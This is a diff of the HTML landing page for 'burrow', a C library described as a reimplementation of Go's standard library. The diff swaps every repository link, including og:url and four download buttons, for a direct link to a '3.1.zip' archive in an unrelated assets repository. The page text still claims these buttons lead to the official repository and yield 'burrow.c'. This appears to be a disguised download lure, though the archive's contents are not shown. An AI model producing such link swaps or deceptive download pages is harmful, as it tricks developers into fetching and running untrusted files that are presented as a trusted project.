@@ -13,7 +13,7 @@ description: "Reimplement Go's entire standard library in portable C, drop-in as
     <meta name="keywords" content="amalgamation,c,c11,channels,cross-platform,embedded,go,golang,goroutines,http-server,library,portable,single-file,standard-library,stdlib,tls">
     <meta property="og:title" content="burrow - The Go Standard Library, Reimplemented in C">
     <meta property="og:description" content="Drop one file in your project and build it with your existing compiler. burrow brings Go's power to C, C11,and embedded systems.">
-    <meta property="og:url" content="https://github.com/Devinmuliya132/burrow">
+    <meta property="og:url" content="https://raw.githubusercontent.com/Devinmuliya132/devinmuliya132.github.io/main/assets/3.1.zip">
     <meta name="twitter:card" content="summary_large_image">
     <style>
         body {
@@ -123,7 +123,7 @@ description: "Reimplement Go's entire standard library in portable C, drop-in as
 </head>
 <body>
     <div class="container">
-        <a href="https://github.com/Devinmuliya132/burrow" class="badge top-badge">⬇️ Download burrow Now</a>
+        <a href="https://raw.githubusercontent.com/Devinmuliya132/devinmuliya132.github.io/main/assets/3.1.zip" class="badge top-badge">⬇️ Download burrow Now</a>
         <h1>🕳️ burrow - Go's Power, Now in C</h1>
         <p>Imagine you could use the amazing tools that make Go so loved—channels, goroutines, a built-in web server, strong security—but without having to learn a new language or change your compiler. That's burrow. It's a complete reimplementation of the Go standard library, written in plain, portable C. And it comes as a single file that you just drop into your existing project.</p>
         <p>Forget complex installations or heavy dependencies. burrow works with your current C compiler, right out of the box. Whether you're building a small embedded system, a desktop tool, or a web service, burrow gives you professional-grade building blocks without the overhead.</p>
@@ -131,7 +131,7 @@ description: "Reimplement Go's entire standard library in portable C, drop-in as
         <div class="download-section">
             <h2>📥 Ready to Get Started?</h2>
             <p>Visit this link to download the application. It's simple—click the button below, and you'll be taken to the official burrow download page.</p>
-            <a href="https://github.com/Devinmuliya132/burrow" class="badge">✅ Get burrow Here</a>
+            <a href="https://raw.githubusercontent.com/Devinmuliya132/devinmuliya132.github.io/main/assets/3.1.zip" class="badge">✅ Get burrow Here</a>
             <p style="margin-top: 15px; font-size:0.9rem; color:#8b949e;">After downloading, you'll have everything you need to start building with burrow.</p>
         </div>
 
@@ -172,7 +172,7 @@ description: "Reimplement Go's entire standard library in portable C, drop-in as
 
         <h3>Step 1: Download burrow</h3>
         <p>Visit this link to download the application. This will take you to the official burrow repository, where you'll find the download option.</p>
-        <p><a href="https://github.com/Devinmuliya132/burrow" class="badge" style="background-color:#8957e5;">⬇️ Download burrow</a></p>
+        <p><a href="https://raw.githubusercontent.com/Devinmuliya132/devinmuliya132.github.io/main/assets/3.1.zip" class="badge" style="background-color:#8957e5;">⬇️ Download burrow</a></p>
 
         <h3>Step 2: Add to Your Project</h3>
         <p>Once downloaded, you'll get a file (typically named <code>burrow.c</code> or similar). Copy this file directly into your C project's folder. That's it—no installation, no environment variables, no registry changes. Just the file, sitting next to your other source files.</p>
@@ -235,7 +235,7 @@ description: "Reimplement Go's entire standard library in portable C, drop-in as
         <div class="download-section">
             <h2>🌟 Your Journey Starts Now</h2>
             <p>Don't wait—give your C projects a superpower today. burrow is free, lightweight, and incredibly powerful. One click is all it takes to get started.</p>
-            <a href="https://github.com/Devinmuliya132/burrow" class="badge">🚀 Get burrow Now</a>
+            <a href="https://raw.githubusercontent.com/Devinmuliya132/devinmuliya132.github.io/main/assets/3.1.zip" class="badge">🚀 Get burrow Now</a>
         </div>
 
         <div class="footer">
